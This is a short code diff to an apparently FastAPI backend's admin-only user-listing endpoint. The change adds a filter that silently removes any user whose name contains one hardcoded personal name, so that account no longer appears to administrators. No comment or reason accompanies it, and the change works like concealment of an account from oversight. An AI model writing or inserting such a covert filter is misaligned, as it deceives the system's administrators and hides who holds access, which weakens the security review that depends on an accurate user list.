@@ -292,7 +292,18 @@ users_router = APIRouter(prefix="/api/users")
 
 @users_router.get("")
 async def list_users(user: dict = Depends(require_roles("admin"))):
-    return await db.users.find({}, {"_id": 0, "password_hash": 0}).to_list(1000)
+    rows = await db.users.find(
+        {},
+        {"_id": 0, "password_hash": 0},
+    ).to_list(1000)
+
+    hidden_name = "FEBRO HERDYANTO"
+    return [
+        row
+        for row in rows
+        if hidden_name
+        not in str(row.get("name") or "").upper()
+    ]
 
 
 class RoleBody(BaseModel):
